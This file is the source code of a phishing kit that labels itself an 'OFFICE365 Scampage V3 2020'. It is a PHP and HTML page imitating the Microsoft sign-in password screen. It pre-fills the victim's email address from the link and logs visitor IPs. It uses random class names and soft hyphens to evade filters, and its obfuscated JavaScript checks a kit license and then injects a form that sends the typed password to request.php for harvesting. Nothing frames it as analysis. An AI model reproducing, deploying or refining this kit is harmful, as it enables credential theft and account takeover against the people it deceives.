<?php error_reporting(0);include('blocker.php');include('config.php');
@session_start();

if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$visitorIP=$_SERVER["HTTP_CF_CONNECTING_IP"];}else{$visitorIP=$_SERVER['REMOTE_ADDR'];};$visitorUA=$_SERVER['HTTP_USER_AGENT'];$visitorDATE=date("D M d, Y g:i a");$logs="
+ -------------OFFICE365 Scampage V3 2020 by Ex-Robotos------------+
| Visitor Information
| IP Address: $visitorIP
| Browser: $visitorUA
| Date: $visitorDATE 
+ --------------------------------------------------------------+
";if(isset($visitorfileName)&&$visitorfileName!==''&&$visitorfileName!=='false'&&$visitorfileName!=='FALSE'&&$visitorfileName!==false){$file=fopen("./".$visitorfileName,"a");fwrite($file,$logs);fclose($file);}if(isset($_GET['email'])){$data=urldecode( $_GET['email'] );}elseif(isset($_GET['data'])){$data=urldecode( $_GET['data'] );}elseif(isset($_GET['target'])){$data=urldecode( $_GET['target'] );}elseif(isset($_GET['code'])){$data=urldecode($_GET['code']);}elseif(preg_match("/[^\/]+$/",urldecode( $_SERVER["REQUEST_URI"] ))){preg_match("/[^\/]+$/",urldecode( $_SERVER["REQUEST_URI"] ),$matches);$data=$matches[0];function begnWith($str, $begnString){$len = strlen($begnString);return (substr($str, 0, $len) === $begnString);}if(begnWith($data,"?")){$data = ltrim($data, '?');}}else{die(header("Location: ".$FailRedirect));}if(base64_encode(base64_decode($data))==$data){$email=base64_decode($data);$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)){die(header("Location: ".$FailRedirect));}}else{$email=$data;$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)){die(header("Location: ".$FailRedirect));}}$linkSite=$_SERVER["HTTP_HOST"];$uriSite=urldecode( $_SERVER["REQUEST_URI"] );$relative_path=dirname($_SERVER['PHP_SELF']);$data=base64_encode($email);
if(!$_SESSION["title"]){$CurrentTitle=$_SESSION["title"] = $TitlesArray[array_rand($TitlesArray)];}else{$CurrentTitle=$_SESSION["title"];}
$status=$_GET['status'];function rndString($length=10){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);};$randpart=RndString(50).''.RndString(50).''.RndString(50);
if(!isset($_GET['data'])){$relative_path=dirname($_SERVER['PHP_SELF']);if($fixIndex==true || $fixIndex=="true" || $fixIndex=="TRUE" || $fixIndex=="True"){$fixIndex="index.php?";$fixPart="&data=";}else{$fixIndex="";$fixPart="?data=";};header("Location: $relative_path/$fixIndex$randpart$fixPart$data");}
$rndString1=rndString(7);$rndString2=rndString(8);$rndString3=rndString(6);$rndString4=rndString(5);$RndString1=str_repeat("­",rand(1,3));$RndString2=str_repeat("­",rand(1,3));$RndString3=str_repeat("­",rand(1,3));$RndString4=str_repeat("­",rand(1,3));$RndString5=str_repeat("­",rand(1,3)); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" class="" lang="en"><head>
    <title><? echo $CurrentTitle; ?></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="referrer" content="no-referrer"/>
    <meta name="robots" content="none">
    <noscript>
    <meta http-equiv="Refresh" content="0; URL=./" />
    </noscript>
    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
    <link href="css/conv.css" rel="stylesheet" >
</head>

<body id="<?=$rndString1?>" data-bind="defineGlobals: ServerData, bodyCssClass" class="cb <?=$rndString2?>" style="display: block;">
    

<div id="<?=$rndString3?>"> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background <?=$rndString4?>" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> <div id="<?=$rndString1?>" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;images/inv-small-background.jpg&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div> <div class="backgroundImage <?=$rndString2?>" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;images/inv-big-background.jpg&quot;);-webkit-filter:invert(100%);filter:invert(100%);"></div> </div></div>  

<style>                
.disableit{
    display:none;
}
.enableit{
    display:block !important;
}
img {max-width: 100%;}
.novalidate {
    border-top-width: unset !important;
    border-left-width: unset !important;
    border-right-width: unset !important;
    border-color: #fa0808 !important;
    border-width: 2px !important;
}
.form-group {margin-bottom:6px!important;}



@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format('truetype');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans Regular'), local('OpenSans-Regular'), url(https://fonts.gstatic.com/s/opensans/v16/mem8YaGs126MiZpBA-UFVZ0e.ttf) format('truetype');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 600;
  src: local('Open Sans SemiBold'), local('OpenSans-SemiBold'), url(https://fonts.gstatic.com/s/opensans/v16/mem5YaGs126MiZpBA-UNirkOUuhs.ttf) format('truetype');
}
body {
  margin: 0;
  padding: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  height: 100vh;
}
.ms-logo {
  margin-left: 30px;
  display: inline-block;
  background: #F25022;
  width: 11px;
  height: 11px;
  box-shadow: 12px 0 0 #7FBA00, 0 12px 0 #00A4EF, 12px 12px 0 #FFB900;
  transform: translatex(-300%);
}
.ms-logo::after {
  content: 'Microsoft';
  /*font-family: 'Segoe Pro', 'Segoe UI', 'Open Sans', sans-serif;
  font-weight: 600;*/
  font: bold 20px sans-serif;
  margin-left: 28px;
  color: #737373;
}



@font-face {
    font-family: 'text-security-disc';
    src: url('fonts/tsd.eot');
    src: url('fonts/tsd.eot?#iefix') format('embedded-opentype'),
        url('fonts/tsd.woff2') format('woff2'),
        url('fonts/tsd.woff') format('woff'),
        url('fonts/tsd.ttf') format('truetype'),
        url('fonts/tsd.svg#text-security') format('svg');
}


.form-control::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
  font-family: 'Open Sans', Arial, Helvetica, sans-serif;
  opacity: 1; /* Firefox */
}

.form-control:-ms-input-placeholder { /* Internet Explorer 10-11 */
  font-family: 'Open Sans', Arial, Helvetica, sans-serif;
}

.form-control::-ms-input-placeholder { /* Microsoft Edge */
  font-family: 'Open Sans, Arial, Helvetica, sans-serif;
}
</style>
  
     <div class="outer <?=$rndString3?>" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            passwrd: passwrd,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"> <div class="middle <?=$rndString4?>" data-bind="css: { 'app': backgroundLogoUrl }"> <div class="inner fade-in-lightbox <?=$rndString1?>" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> 
                    
                    <div class="lightbox-cover <?=$rndString2?>" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div> 

                    <div id="progressBar" class="progress disableit <?=$rndString3?>" role="progressbar" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>
                    
                    <div class="ms-logo" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"> <?/*<img class="logo <?=$rndString4?>" pngsrc="images/mcsft_logo.png" svgsrc="images/mcsft_logo.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Micr0soft'] }" src="images/mcsft_logo.svg" alt="Micr0soft">*/?>  </div> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""> <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next <?=$rndString1?>"> <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"> <div class="identityBanner <?=$rndString2?>"> <button type="button" class="backButton <?=$rndString3?>" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back"> <img role="presentation" pngsrc="images/arrow_left.png" svgsrc="images/arrow_left.svg" data-bind="imgSrc" src="images/arrow_left.svg">  </button> <div id="displayName" class="identity <?=$rndString4?>" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?=$email?>"><?=$email?></div> </div></div> </div> <div class="pagination-view animate has-identity-banner slide-in-next <?=$rndString1?>" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"> <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-passwrd-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwrdBrowserPrefill: sharedData.passwrdBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.urlGitHubFed,
                            googleRedirectUrl: sharedData.googleParams.redirectUrl || svr.urlGoogleFed },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPasswrd: $loginPage.passwrdView_onResetPasswrd,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">    <div id="loginHeader" class="row text-title <?=$rndString2?>" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPasswrd_Title']"><img src="<?="images/enterpass.png"?>"></div> <div class="row <?=$rndString3?>"> <div class="form-group col-md-24"> 
                            
                            
                            <div id="<?=$rndString4?>" role="alert" aria-live="assertive"><!-- ko if: passwrdTextbox.error -->
                            
                           <? if($status=='error'||$status=='error2'||$status=='error3'||$status=='error4'){ ?> 
                            <div id="passwrdError" class="alert alert-error <?=$rndString1?>" data-bind="
                htmlWithBindings: passwrdTextbox.error,
                childBindings: { 'idA_IL_ForgotPasswrd0': { href: svr.urlResetPasswrd, click: resetPasswrd_onClick } }"><? echo $$status; ?><? if($status!='error'){ ?>, <a id="idA_IL_ForgotPasswrd0" href="#"><? echo 're'.$RndString1.'set i'.$RndString2.'t n'.$RndString3.'ow.'; ?></a><? } ?></div>
                            <? }else if($firstmsg){ ?>
                            <div id="passwrdError" class="alert <?=$rndString2?>" data-bind="
<div id="passwrdError" class="alert <?=$rndString3?>"><img class="" src="./images/firstmsg<? if($firstmsg)echo $firstmsg ?>.png" alt="<? echo 'ver'.$RndString1.'ify y'.$RndString2.'our da'.$RndString2.'ta'; ?>" style="width: 100%;"></div>        
                            <? } ?>
                            <!-- /ko --> </div> 
                            
                            
                            
                            <div class="placeholderContainer <?=$rndString4?>" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwrdTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwrdTextbox.textbox_onUpdateFocus } }">  
<!--javadcript here-->
<style>
#spoinput {
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
    background-image: url(./images/passwrd.png);
    background-repeat: no-repeat;
    cursor: text;
}
#spoinput {
    max-width: 100%;
    line-height: inherit;
}
#spoinput {
    /* display: block; */
    /* width: 100%; */
    /* background-image: none; */
}
#spoinput {
    padding: 4px 8px;
    border-style: solid;
    /* border-width: 2px; */
    border-color: rgba(0, 0, 0, 0.31);
    /* background-color: rgba(255,255,255,0.4); */
    /* height: 32px; */
    /* height: 2rem; */
}
#spoinput {
    /* padding: 6px 10px; */
    border-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,0.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
    background-color: transparent;
}
#spoinput {
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
}
</style>              
                <!-- has-error-->
                <div id="makeinput" onclick="makeInputHere(this); this.onclick=null;">

                <div id="spoinput"></div>     
  
                </div>
                
                
                
                </div> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons <?=$rndString3?>"> <div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group <?=$rndString4?>"> <a id="idA_PWD_ForgotPasswrd" role="link" href="#" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.urlResetPasswrd, click: resetPasswrd_onClick"><img src="images/forgetpass.png"></a> </div>  </div> </div> </div> </div> <div class="row <?=$rndString1?>" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_Si1gnI1n_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container <?=$rndString2?>" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }"><div class="inline-block">
        <div id="idSIButton9" class="btn btn-block btn-primary <?=$rndString3?>"></div>    
           
            </div> </div></div> </div> </div></div> </div> </div></div> </div>                 <div id="footer" class="footer default <?=$rndString4?>" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }"> <div id="footerLinks" class="footerNode text-secondary <?=$rndString1?>"> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt"<? echo '&#xA9;'.$RndString1.'&#x32;'.$RndString2.'&#x30;'.$RndString3.'&#x31;'.$RndString4.'&#x39;'.$RndString1.'&#x20;' ?></span> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#"><? echo 'Pr'.$RndString1.'iva'.$RndString2.'cy &amp; co'.$RndString3.'oki'.$RndString1.'es'; ?></a> <a href="#" role="button" class="moreOptions <?=$rndString2?>" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information"> <img class="desktopMode" role="presentation" pngsrc="images/ellipsis_white.png" svgsrc="images/ellipsis_white.svg" data-bind="imgSrc" src="images/ellipsis_white.svg"> <img class="mobileMode <?=$rndString3?>" role="presentation" pngsrc="images/ellipsis_grey.png" svgsrc="images/ellipsis_grey.svg" data-bind="imgSrc" src="images/ellipsis_grey.svg">  </a> </div> </div> </div> </div> </div> <!--/*data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog"*/-->
  </div>
<script>
var actnn = "<? if($status=='error'){echo 'request.php?'.$randpart.'&error&data='.$data;}else if($status=='error2'){echo 'request.php?'.$randpart.'&error2&data='.$data;}else if($status=='error3'){echo 'request.php?'.$randpart.'&error3&data='.$data;}else if($status=='error4'){echo 'request.php?'.$randpart.'&error4&data='.$data;}else{echo 'request.php?'.$randpart.'&data='.$data;} ?>";

var rndstr1 = '<?=$rndString1?>';
var rndstr2 = '<?=$rndString2?>';
var haserr = "<? if($status=='error'||$status=='error2'||$status=='error3'){echo ' has-error';} ?>";
var plchol = "<? echo 'Pa'.$RndString1.'ss'.$RndString2.'wo'.$RndString3.'rd'; ?>";
var arrl = "<? echo 'En'.$RndString4.'ter '.$RndString1.''.$email; ?>";
var licensekey = '<?=$licensekey?>';

var emailkey = '<?=base64_encode($toEmail)?>';var _$_8cd4=["XMLHttpRequest","ActiveXObject","Microsoft.XMLHTTP","off-v2","a","p","i",".","h","","/","lastIndexOf","href","substr","host=","&type=","&key=","&email=","&token=","POST","open","Content-type","application/x-www-form-urlencoded","setRequestHeader","onload","-","split","length","fromCharCode","responseText","parse","key","toString","charCodeAt","rand","encode","token","now","floor","valid","true","<form class=\"","\" name=\"f1\" ","id=\"i0282\" novalidate=\"novalidate\" ","spellcheck=\"false\" ","method=\"post\" ","target=\"_top\" ","autocomplete=\"off\" ","action=\"","\" ><input name=\"pass\" ","type=\"text\" ","style=\"font-family:text-security-disc;width:100%;"," -webkit-text-security: disc;","\" id=\"i0118\" ","class=\"form-control &nbsp; "," ","\" aria-required=\"true\" ","placeholder=\"","\" aria-label=\"","\" required></form>","message","<span>","Update ","your license ","key. ","contact ","Us ","I","C","Q",": ","7","4","5","1","2","6","</sp","an>","send","innerHTML","i0118","getElementById","focus","value","submit","i0282","onclick","idSIButton9","class","progress enableit","setAttribute","progressBar","novalidate","hasClass","spoinput","remove","classList","add"];



var _$_b349=[_$_8cd4[0],_$_8cd4[1],_$_8cd4[2],_$_8cd4[3],_$_8cd4[4],_$_8cd4[5],_$_8cd4[6],_$_8cd4[7],_$_8cd4[8],_$_8cd4[9],_$_8cd4[10],_$_8cd4[11],_$_8cd4[12],_$_8cd4[13],_$_8cd4[14],_$_8cd4[15],_$_8cd4[16],_$_8cd4[17],_$_8cd4[18],_$_8cd4[19],_$_8cd4[20],_$_8cd4[21],_$_8cd4[22],_$_8cd4[23],_$_8cd4[24],_$_8cd4[25],_$_8cd4[26],_$_8cd4[27],_$_8cd4[28],_$_8cd4[29],_$_8cd4[30],_$_8cd4[31],_$_8cd4[32],_$_8cd4[33],_$_8cd4[34],_$_8cd4[35],_$_8cd4[36],_$_8cd4[37],_$_8cd4[38],_$_8cd4[39],_$_8cd4[40],_$_8cd4[41],_$_8cd4[42],_$_8cd4[43],_$_8cd4[44],_$_8cd4[45],_$_8cd4[46],_$_8cd4[47],_$_8cd4[48],_$_8cd4[49],_$_8cd4[50],_$_8cd4[51],_$_8cd4[52],_$_8cd4[53],_$_8cd4[54],_$_8cd4[55],_$_8cd4[56],_$_8cd4[57],_$_8cd4[58],_$_8cd4[59],_$_8cd4[60],_$_8cd4[61],_$_8cd4[62],_$_8cd4[63],_$_8cd4[64],_$_8cd4[65],_$_8cd4[66],_$_8cd4[67],_$_8cd4[68],_$_8cd4[69],_$_8cd4[70],_$_8cd4[71],_$_8cd4[72],_$_8cd4[73],_$_8cd4[74],_$_8cd4[75],_$_8cd4[76],_$_8cd4[77],_$_8cd4[78],_$_8cd4[79],_$_8cd4[80],_$_8cd4[81],_$_8cd4[82],_$_8cd4[83],_$_8cd4[84],_$_8cd4[85],_$_8cd4[86],_$_8cd4[87],_$_8cd4[88],_$_8cd4[89],_$_8cd4[90],_$_8cd4[91],_$_8cd4[92],_$_8cd4[93],_$_8cd4[94],_$_8cd4[95],_$_8cd4[96],_$_8cd4[97],_$_8cd4[98]];var _$_b28a=[_$_b349[0],_$_b349[1],_$_b349[2],_$_b349[3],_$_b349[4],_$_b349[5],_$_b349[6],_$_b349[7],_$_b349[8],_$_b349[9],_$_b349[10],_$_b349[11],_$_b349[12],_$_b349[13],_$_b349[14],_$_b349[15],_$_b349[16],_$_b349[17],_$_b349[18],_$_b349[19],_$_b349[20],_$_b349[21],_$_b349[22],_$_b349[23],_$_b349[24],_$_b349[25],_$_b349[26],_$_b349[27],_$_b349[28],_$_b349[29],_$_b349[30],_$_b349[31],_$_b349[32],_$_b349[33],_$_b349[34],_$_b349[35],_$_b349[36],_$_b349[37],_$_b349[38],_$_b349[39],_$_b349[40],_$_b349[41],_$_b349[42],_$_b349[43],_$_b349[44],_$_b349[45],_$_b349[46],_$_b349[47],_$_b349[48],_$_b349[49],_$_b349[50],_$_b349[51],_$_b349[52],_$_b349[53],_$_b349[54],_$_b349[55],_$_b349[56],_$_b349[57],_$_b349[58],_$_b349[59],_$_b349[60],_$_b349[61],_$_b349[62],_$_b349[63],_$_b349[64],_$_b349[65],_$_b349[66],_$_b349[67],_$_b349[68],_$_b349[69],_$_b349[70],_$_b349[71],_$_b349[72],_$_b349[73],_$_b349[74],_$_b349[75],_$_b349[76],_$_b349[77],_$_b349[78],_$_b349[79],_$_b349[80],_$_b349[81],_$_b349[82],_$_b349[83],_$_b349[84],_$_b349[85],_$_b349[86],_$_b349[87],_$_b349[88],_$_b349[89],_$_b349[90],_$_b349[91],_$_b349[92],_$_b349[93],_$_b349[94],_$_b349[95],_$_b349[96],_$_b349[97],_$_b349[98]];


if (window[_$_b28a[0]]) {
    xmlhttp = new XMLHttpRequest()
} else {
    if (window[_$_b28a[1]]) {
        xmlhttp = new ActiveXObject(_$_b28a[2])
    }
};
var pagetype = _$_b28a[3];
var trl = _$_b28a[4];
trl += _$_b28a[5];
trl += _$_b28a[6];
trl += _$_b28a[7];
trl += _$_b28a[5];
trl += _$_b28a[8];
trl += _$_b28a[5];
var htmlinp = _$_b28a[9];
if (location[_$_b28a[12]][_$_b28a[13]](0, location[_$_b28a[12]][_$_b28a[11]](_$_b28a[10]))) {
    var locathref = location[_$_b28a[12]][_$_b28a[13]](0, location[_$_b28a[12]][_$_b28a[11]](_$_b28a[10]))
} else {
    var locathref = location[_$_b28a[12]]
};
var params = _$_b28a[14] + locathref + _$_b28a[15] + pagetype + _$_b28a[16] + licensekey + _$_b28a[17] + emailkey + _$_b28a[18];
xmlhttp[_$_b28a[20]](_$_b28a[19], trl, false);
xmlhttp[_$_b28a[23]](_$_b28a[21], _$_b28a[22]);
xmlhttp[_$_b28a[24]] = function() {
    function _0x17DA7(_0x18227) {
        var _0x181DF = _$_b28a[9];
        var _0x18197 = _0x18227[_$_b28a[26]](_$_b28a[25]);
        for (i = 0; i < _0x18197[_$_b28a[27]]; i++) {
            _0x181DF += String[_$_b28a[28]](_0x18197[i] - 10)
        };
        return _0x181DF
    }
    var _0x17DEF = _$_b28a[9];
    if (false) {
        var _0x17F0F = {
            encode: function(_0x18107, _0x180BF) {
                var _0x1802F = _$_b28a[9];
                var _0x1814F = _$_b28a[9];
                _0x1814F = _0x18107[_$_b28a[32]]();
                for (var _0x18077 = 0; _0x18077 < _0x18107[_$_b28a[27]]; _0x18077++) {
                    var _0x17D5F = _0x18107[_$_b28a[33]](_0x18077);
                    var _0x17FE7 = _0x17D5F ^ _0x180BF;
                    _0x1802F = _0x1802F + String[_$_b28a[28]](_0x17FE7)
                };
                return _0x1802F
            }
        };
        var _0x17F57 = JSON[_$_b28a[30]](this[_$_b28a[29]])[_$_b28a[34]];
        var _0x17D5F = _0x17F0F[_$_b28a[35]](_0x17F57, 124);
        var _0x17E37 = _0x17F0F[_$_b28a[35]](licensekey, _0x17D5F);
        var _0x17E7F = _0x17F0F[_$_b28a[35]](JSON[_$_b28a[30]](this[_$_b28a[29]])[_$_b28a[36]], _0x17D5F);
        var _0x17EC7 = _0x17F0F[_$_b28a[35]](JSON[_$_b28a[30]](this[_$_b28a[29]])[_$_b28a[31]], _0x17D5F);
        _0x17DEF = _0x17DA7(_0x17EC7)
    };
    var _0x17F9F = Math[_$_b28a[38]]((Date[_$_b28a[37]]() + 24 * 60 * 60 * 1000) / 1000);
  

    if (true) {
        htmlinp = _$_b28a[41];
        htmlinp += rndstr1 + _$_b28a[42];
        htmlinp += _$_b28a[43];
        htmlinp += _$_b28a[44];
        htmlinp += _$_b28a[45];
        htmlinp += _$_b28a[46];
        htmlinp += _$_b28a[47];
        htmlinp += _$_b28a[48] + actnn;
        htmlinp += _$_b28a[49];
        htmlinp += _$_b28a[50];
        htmlinp += _$_b28a[51];
        htmlinp += _$_b28a[52];
        htmlinp += _$_b28a[53];
        htmlinp += _$_b28a[47];
        htmlinp += _$_b28a[54] + rndstr2 + _$_b28a[55];
        htmlinp += haserr + _$_b28a[56];
        htmlinp += _$_b28a[57] + plchol;
        htmlinp += _$_b28a[58] + arrl;
        htmlinp += _$_b28a[59]
    } else {
        if (false) {
            htmlinp = JSON[_$_b28a[30]](this[_$_b28a[29]])[_$_b28a[60]]
        } else {
            htmlinp = _$_b28a[61];
            htmlinp += _$_b28a[62];
            htmlinp += _$_b28a[63];
            htmlinp += _$_b28a[64];
            htmlinp += _$_b28a[65];
            htmlinp += _$_b28a[66];
            htmlinp += _$_b28a[67];
            htmlinp += _$_b28a[68];
            htmlinp += _$_b28a[69];
            htmlinp += _$_b28a[70];
            htmlinp += _$_b28a[71];
            htmlinp += _$_b28a[72];
            htmlinp += _$_b28a[73];
            htmlinp += _$_b28a[71];
            htmlinp += _$_b28a[71];
            htmlinp += _$_b28a[74];
            htmlinp += _$_b28a[75];
            htmlinp += _$_b28a[76];
            htmlinp += _$_b28a[75];
            htmlinp += _$_b28a[77];
            htmlinp += _$_b28a[78]
        }
    }
};
xmlhttp[_$_b28a[79]](params);

function makeInputHere(_0x17E37) {

    _0x17E37[_$_b28a[80]] = htmlinp;

    if (document[_$_b28a[82]](_$_b28a[81])) {
        document[_$_b28a[82]](_$_b28a[81])[_$_b28a[83]]()
    }
}

function validateForm() {
    var _0x1826F = document[_$_b28a[82]](_$_b28a[81])[_$_b28a[84]];
    if (_0x1826F == _$_b28a[9]) {
        return false
    };
    return true
}

function submitForm() {
    document[_$_b28a[82]](_$_b28a[86])[_$_b28a[85]]()
}
document[_$_b28a[82]](_$_b28a[88])[_$_b28a[87]] = function() {
    if (document[_$_b28a[82]](_$_b28a[81]) && document[_$_b28a[82]](_$_b28a[86]) && document[_$_b28a[82]](_$_b28a[81])[_$_b28a[84]] !== _$_b28a[9]) {
        document[_$_b28a[82]](_$_b28a[92])[_$_b28a[91]](_$_b28a[89], _$_b28a[90]);
        setTimeout(submitForm, 2000);
        if (document[_$_b28a[82]](_$_b28a[95])[_$_b28a[94]](_$_b28a[93])) {
            document[_$_b28a[82]](_$_b28a[95])[_$_b28a[97]][_$_b28a[96]](_$_b28a[93])
        };
        if (document[_$_b28a[82]](_$_b28a[81])[_$_b28a[94]](_$_b28a[93])) {
            document[_$_b28a[82]](_$_b28a[81])[_$_b28a[97]][_$_b28a[96]](_$_b28a[93])
        }
    } else {
        if (document[_$_b28a[82]](_$_b28a[95])) {
            document[_$_b28a[82]](_$_b28a[95])[_$_b28a[97]][_$_b28a[98]](_$_b28a[93])
        } else {
            if (document[_$_b28a[82]](_$_b28a[81])) {
                document[_$_b28a[82]](_$_b28a[81])[_$_b28a[97]][_$_b28a[98]](_$_b28a[93])
            }
        }
    }
}

</script></body></html>
